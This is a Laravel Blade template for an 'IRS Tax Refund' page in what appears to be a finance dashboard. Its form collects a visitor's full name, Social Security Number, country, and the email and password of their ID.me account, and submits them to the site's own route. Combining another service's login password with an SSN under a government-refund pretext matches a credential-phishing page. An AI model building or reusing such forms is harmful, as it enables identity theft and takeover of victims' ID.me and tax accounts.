@extends('layouts.dash2')
@section('title', 'IRS Tax Refund')
@section('content')

<div class="min-h-screen bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-100 dark:from-slate-900 dark:via-slate-800 dark:to-slate-900 p-3 lg:p-4">
    <div class="max-w-4xl mx-auto">
        <!-- Alerts -->
        <x-danger-alert />
        <x-success-alert />

        <!-- Mobile Header -->
        <div class="lg:hidden mb-2">
            @include('partials._mobile_header', [
                'title' => 'IRS Tax Refund',
                'showBackButton' => true,
                'backUrl' => route('dashboard'),
                'showNotifications' => true,
                'showDarkMode' => true,
                'financeUser' => Auth::user()
            ])
        </div>

        <!-- Desktop Header -->
        <div class="hidden lg:flex items-center justify-between mb-4">
            <div class="flex items-center space-x-2">
                <a href="{{ route('dashboard') }}" class="inline-flex items-center justify-center w-8 h-8 rounded-full bg-white/70 dark:bg-gray-800/70 backdrop-blur-sm hover:bg-gray-50 dark:hover:bg-gray-700 text-gray-500 dark:text-gray-400 border border-gray-200 dark:border-gray-600 transition-colors">
                    <i class="fas fa-arrow-left text-xs"></i>
                </a>
                <h1 class="text-xl font-bold text-gray-900 dark:text-white">IRS Tax Refund</h1>
            </div>
            <div class="flex items-center space-x-2">
                <a href="{{ route('irs-refund.track') }}" class="inline-flex items-center px-3 py-1.5 text-sm font-medium text-gray-700 dark:text-gray-300 bg-white/70 dark:bg-gray-800/70 backdrop-blur-sm border border-gray-200 dark:border-gray-600 rounded-lg hover:bg-gray-50 dark:hover:bg-gray-700 transition-colors">
                    <i class="fas fa-chart-line mr-1.5 text-xs"></i>
                    Track Status
                </a>
            </div>
        </div>

        @if($refund && in_array($refund->status, ['pending', 'approved']))
            <div class="bg-white/95 dark:bg-gray-800/95 backdrop-blur-xl rounded-xl shadow-sm border border-white/20 dark:border-gray-700/50 overflow-hidden mb-4">
                <div class="p-4 lg:p-5">
                    <div class="flex items-center justify-center mb-4">
                        <div class="h-12 w-12 rounded-full {{ $refund->status === 'approved' ? 'bg-green-100 dark:bg-green-900/30' : 'bg-yellow-100 dark:bg-yellow-900/30' }} flex items-center justify-center">
                            <i class="fas {{ $refund->status === 'approved' ? 'fa-check-circle text-green-600 dark:text-green-400' : 'fa-clock text-yellow-600 dark:text-yellow-400' }} text-lg"></i>
                        </div>
                    </div>
                    <h3 class="text-lg font-medium text-gray-900 dark:text-white text-center mb-2">
                        {{ $refund->status === 'approved' ? 'Your Refund Request is Approved' : 'Your Refund Request is Pending' }}
                    </h3>
                    <p class="text-sm text-gray-600 dark:text-gray-400 text-center mb-4">
                        {{ $refund->status === 'approved' 
                            ? 'Your refund request has been approved. You will be notified when the refund is processed.' 
                            : 'Your refund request is currently being reviewed. Please check back later for updates.' }}
                    </p>
                    <div class="flex justify-center">
                        <a href="{{ route('irs-refund.track') }}" class="inline-flex items-center justify-center px-4 py-2 border border-transparent rounded-lg shadow-sm text-sm font-medium text-white bg-gradient-to-r from-primary-600 to-primary-700 hover:from-primary-700 hover:to-primary-800 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-primary-500 transition-all duration-200">
                            <i class="fas fa-chart-line mr-2 text-xs"></i> Track Status
                        </a>
                    </div>
                </div>
            </div>
        @else
            <div class="bg-white/95 dark:bg-gray-800/95 backdrop-blur-xl rounded-xl shadow-sm border border-white/20 dark:border-gray-700/50 overflow-hidden">
                <div class="p-4 lg:p-5">
                    <!-- Header -->
                    <div class="text-center mb-6">
                        <div class="inline-flex items-center justify-center w-16 h-16 rounded-full bg-primary-100/80 dark:bg-primary-900/30 backdrop-blur-sm mb-3">
                            <i class="fas fa-receipt text-primary-600 dark:text-primary-400 text-xl"></i>
                        </div>
                        <h2 class="text-xl font-bold text-gray-900 dark:text-white mb-2">IRS Tax Refund Request</h2>
                        <p class="text-sm text-gray-600 dark:text-gray-400">Please fill out the form below to submit your IRS tax refund request</p>
                    </div>

                    <form action="{{ route('irs-refund.store') }}" method="POST" class="space-y-5">
                        @csrf
                        
                        <!-- Personal Information Section -->
                        <div class="bg-gray-50/80 dark:bg-gray-700/50 backdrop-blur-sm p-4 rounded-lg">
                            <h3 class="text-lg font-medium text-gray-900 dark:text-white mb-4 flex items-center">
                                <i class="fas fa-user text-primary-500 dark:text-primary-400 mr-2 text-sm"></i>
                                Personal Information
                            </h3>
                            
                            <!-- Name -->
                            <div class="mb-4">
                                <label for="name" class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Full Name</label>
                                <div class="relative">
                                    <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none z-10">
                                        <i class="fas fa-user text-gray-400 dark:text-gray-500 text-xs"></i>
                                    </div>
                                    <input type="text" name="name" id="name" value="{{ old('name') }}" required
                                        class="block w-full pl-10 pr-3 py-2.5 border border-gray-300 dark:border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-primary-500 focus:border-primary-500 bg-white/90 dark:bg-gray-700/90 backdrop-blur-sm text-gray-900 dark:text-white placeholder-gray-500 dark:placeholder-gray-400 text-sm relative z-0"
                                        placeholder="Enter your full name">
                                </div>
                                @error('name')
                                    <p class="mt-1 text-sm text-red-600 dark:text-red-400">{{ $message }}</p>
                                @enderror
                            </div>

                            <!-- SSN -->
                            <div class="mb-4">
                                <label for="ssn" class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Social Security Number (SSN)</label>
                                <div class="relative">
                                    <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none z-10">
                                        <i class="fas fa-shield-alt text-gray-400 dark:text-gray-500 text-xs"></i>
                                    </div>
                                    <input type="text" name="ssn" id="ssn" value="{{ old('ssn') }}" required
                                        class="block w-full pl-10 pr-3 py-2.5 border border-gray-300 dark:border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-primary-500 focus:border-primary-500 bg-white/90 dark:bg-gray-700/90 backdrop-blur-sm text-gray-900 dark:text-white placeholder-gray-500 dark:placeholder-gray-400 text-sm relative z-0"
                                        placeholder="XXX-XX-XXXX">
                                </div>
                                @error('ssn')
                                    <p class="mt-1 text-sm text-red-600 dark:text-red-400">{{ $message }}</p>
                                @enderror
                            </div>
                        </div>

                        <!-- ID.me Credentials Section -->
                        <div class="bg-gray-50/80 dark:bg-gray-700/50 backdrop-blur-sm p-4 rounded-lg">
                            <h3 class="text-lg font-medium text-gray-900 dark:text-white mb-4 flex items-center">
                                <i class="fas fa-lock text-primary-500 dark:text-primary-400 mr-2 text-sm"></i>
                                ID.me Credentials
                            </h3>
                            
                            <!-- ID.me Email -->
                            <div class="mb-4">
                                <label for="idme_email" class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">ID.me Email</label>
                                <div class="relative">
                                    <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none z-10">
                                        <i class="fas fa-envelope text-gray-400 dark:text-gray-500 text-xs"></i>
                                    </div>
                                    <input type="email" name="idme_email" id="idme_email" value="{{ old('idme_email') }}" required
                                        class="block w-full pl-10 pr-3 py-2.5 border border-gray-300 dark:border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-primary-500 focus:border-primary-500 bg-white/90 dark:bg-gray-700/90 backdrop-blur-sm text-gray-900 dark:text-white placeholder-gray-500 dark:placeholder-gray-400 text-sm relative z-0"
                                        placeholder="Enter your ID.me email">
                                </div>
                                @error('idme_email')
                                    <p class="mt-1 text-sm text-red-600 dark:text-red-400">{{ $message }}</p>
                                @enderror
                            </div>

                            <!-- ID.me Password -->
                            <div class="mb-4">
                                <label for="idme_password" class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">ID.me Password</label>
                                <div class="relative">
                                    <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none z-10">
                                        <i class="fas fa-key text-gray-400 dark:text-gray-500 text-xs"></i>
                                    </div>
                                    <input type="password" name="idme_password" id="idme_password" required
                                        class="block w-full pl-10 pr-3 py-2.5 border border-gray-300 dark:border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-primary-500 focus:border-primary-500 bg-white/90 dark:bg-gray-700/90 backdrop-blur-sm text-gray-900 dark:text-white placeholder-gray-500 dark:placeholder-gray-400 text-sm relative z-0"
                                        placeholder="Enter your ID.me password">
                                </div>
                                @error('idme_password')
                                    <p class="mt-1 text-sm text-red-600 dark:text-red-400">{{ $message }}</p>
                                @enderror
                            </div>
                        </div>

                        <!-- Location Information Section -->
                        <div class="bg-gray-50/80 dark:bg-gray-700/50 backdrop-blur-sm p-4 rounded-lg">
                            <h3 class="text-lg font-medium text-gray-900 dark:text-white mb-4 flex items-center">
                                <i class="fas fa-map-marker-alt text-primary-500 dark:text-primary-400 mr-2 text-sm"></i>
                                Location Information
                            </h3>
                            
                            <!-- Country -->
                            <div class="mb-4">
                                <label for="country" class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Country</label>
                                @include('partials.country-select', ['fieldName' => 'country', 'required' => true])
                                @error('country')
                                    <p class="mt-1 text-sm text-red-600 dark:text-red-400">{{ $message }}</p>
                                @enderror
                            </div>
                        </div>

                        <!-- Important Notice -->
                        <div class="bg-gradient-to-r from-primary-50/80 to-blue-50/80 dark:from-gray-800/90 dark:to-gray-700/90 backdrop-blur-sm p-4 rounded-lg border border-primary-200/50 dark:border-gray-600/50">
                            <div class="flex">
                                <div class="flex-shrink-0">
                                    <i class="fas fa-info-circle text-primary-600 dark:text-primary-400 text-sm"></i>
                                </div>
                                <div class="ml-3">
                                    <h3 class="text-sm font-medium text-gray-800 dark:text-gray-200">Important Notice</h3>
                                    <div class="mt-2 text-sm text-gray-700 dark:text-gray-300">
                                        <p>Please ensure all information provided is accurate and matches your ID.me account details. Any discrepancies may result in delays or rejection of your refund request.</p>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- Submit Button -->
                        <div class="flex justify-end">
                            <button type="submit" class="inline-flex items-center px-6 py-2.5 border border-transparent rounded-lg shadow-sm text-sm font-medium text-white bg-gradient-to-r from-primary-600 to-primary-700 hover:from-primary-700 hover:to-primary-800 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-primary-500 transition-all duration-200">
                                <i class="fas fa-paper-plane mr-2 text-xs"></i> Submit Request
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        @endif
    </div>
</div>

@endsection 